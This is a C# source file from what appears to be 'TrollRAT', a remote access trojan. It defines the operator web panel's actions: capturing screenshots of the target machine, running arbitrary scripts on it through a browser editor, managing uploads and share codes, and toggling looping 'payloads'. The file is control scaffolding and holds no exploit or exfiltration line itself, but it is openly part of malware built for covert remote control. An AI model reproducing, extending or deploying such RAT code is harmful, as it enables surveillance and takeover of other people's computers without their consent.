using System;
using System.IO;
using TrollRAT.Payloads;
using TrollRAT.Server;
using TrollRAT.Server.Injections;
using TrollRAT.Utils;

namespace TrollRAT.Actions
{
    public class GlobalActionScreenshot : GlobalActionClient
    {
        public override string Title => "Screenshot";
        public override string OnClick => "showScreenshot();";

        public GlobalActionScreenshot(WebServer server) : base(server)
        {
            server.addInjection(InjectionPlaceholders.BODY, ResourceUtil.getResourceString("TrollRAT.Web.HTML.screenshot.html"));
        }
    }

    public class GlobalActionRunScript : GlobalActionClient
    {
        public override string Title => "Run Script";
        public override string OnClick => "showEditor();";

        public GlobalActionRunScript(WebServer server) : base(server)
        {
            server.addInjection(InjectionPlaceholders.HEAD, @"
                <!-- CodeMirror for scripting support -->
                <link rel=""stylesheet"" href=""https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.16.0/codemirror.min.css"">
                <script type=""text/javascript"" src=""https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.16.0/codemirror.min.js""></script>
                <script type=""text/javascript"" src=""https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.16.0/mode/clike/clike.min.js""></script>
            ");

            server.addInjection(InjectionPlaceholders.BODY, ResourceUtil.getResourceString("TrollRAT.Web.HTML.scriptEditor.html"));
        }
    }

    public class GlobalActionShareCodeManager : GlobalActionClient
    {
        public override string Title => "Share Code Manager";
        public override string OnClick => "$('#shareCodeModal').modal();";

        public GlobalActionShareCodeManager(WebServer server) : base(server)
        {
            server.addInjection(InjectionPlaceholders.BODY, ResourceUtil.getResourceString("TrollRAT.Web.HTML.shareCode.html"));
        }
    }

    public class GlobalActionUploadManager : GlobalActionClient
    {
        public override string Title => "Uploads";
        public override string OnClick => "$('#uploadModal').modal();";

        public GlobalActionUploadManager(WebServer server) : base(server)
        {
            server.addInjection(InjectionPlaceholders.BODY, ResourceUtil.getResourceString("TrollRAT.Web.HTML.upload.html"));
        }
    }

    public class GlobalActionPausePayloads : GlobalActionServer
    {
        public override string Title => LoopingPayload.pausePayloads ? "Enable Payloads" : "Disable Payloads";

        public GlobalActionPausePayloads(WebServer server) : base(server) { }

        public override string execute()
        {
            LoopingPayload.pausePayloads = !LoopingPayload.pausePayloads;
            return "update();";
        }

        public override void readFromStream(BinaryReader reader)
        {
            base.readFromStream(reader);
            LoopingPayload.pausePayloads = reader.ReadBoolean();
        }

        public override void writeToStream(BinaryWriter writer)
        {
            base.writeToStream(writer);
            writer.Write(LoopingPayload.pausePayloads);
        }
    }
}
